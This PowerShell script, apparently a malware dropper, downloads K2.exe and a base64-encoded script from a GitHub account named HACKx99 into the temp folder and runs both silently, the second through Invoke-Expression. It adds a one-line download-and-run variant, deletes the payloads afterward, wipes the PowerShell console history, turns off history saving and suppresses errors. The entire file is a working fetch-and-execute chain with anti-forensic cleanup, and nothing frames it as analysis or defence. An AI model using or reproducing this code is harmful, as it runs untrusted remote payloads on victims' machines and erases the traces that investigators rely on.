# RunK2AndClearHistory.ps1
# Script to silently download K2.exe and an encrypted file to %TEMP%, run them, and delete PowerShell console history.

# Define variables
$tempPath = [System.IO.Path]::GetTempPath()
$exeName = "K2.exe"
$exeFullPath = Join-Path $tempPath $exeName
$encryptedFileName = "encrypted_file.ps1"  # Placeholder name for encrypted file
$encryptedFullPath = Join-Path $tempPath $encryptedFileName
$historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
$rawUrlK2 = "https://raw.githubusercontent.com/HACKx99/Main1/main/K2.exe"
$rawUrlEncrypted = "https://raw.githubusercontent.com/HACKx99/Main1/main/encrypted_file.ps1"  # Replace with actual URL

try {
    # Silently download K2.exe
    Invoke-WebRequest -Uri $rawUrlK2 -OutFile $exeFullPath -UseBasicParsing
    
    if (Test-Path $exeFullPath) {
        # Run K2.exe silently
        Start-Process -FilePath $exeFullPath -NoNewWindow -Wait
    } else {
        throw "Download failed: File not found at $exeFullPath"
    }

    # Silently download the encrypted file
    Invoke-WebRequest -Uri $rawUrlEncrypted -OutFile $encryptedFullPath -UseBasicParsing
    
    if (Test-Path $encryptedFullPath) {
        # Decrypt and run the encrypted file (assuming base64 encryption as an example)
        $encryptedContent = Get-Content -Path $encryptedFullPath -Raw
        $decryptedBytes = [Convert]::FromBase64String($encryptedContent)  # Adjust decryption based on your method
        $decryptedScript = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
        Invoke-Expression $decryptedScript
    } else {
        throw "Download failed: File not found at $encryptedFullPath"
    }

    # Alternative one-liner method for K2.exe
    iwr -Uri "https://raw.githubusercontent.com/HACKx99/Main1/main/K2.exe" -OutFile "$env:TEMP\K2.exe" -UseBasicParsing; Start-Process -FilePath "$env:TEMP\K2.exe" -Wait; Remove-Item "$env:TEMP\K2.exe" -Force

    # Silently delete the EXE and encrypted file
    if (Test-Path $exeFullPath) {
        Remove-Item $exeFullPath -Force
    }
    if (Test-Path $encryptedFullPath) {
        Remove-Item $encryptedFullPath -Force
    }

    # Silently delete PowerShell console history
    if (Test-Path $historyPath) {
        # Clear current session history
        Clear-History
        # Remove the history file
        Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
        # Ensure PSReadLine history is cleared by setting history count to 0
        Set-PSReadLineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
    }
} catch {
    # Suppress error output
    exit 1
} finally {
    # Exit silently
    exit 0
}
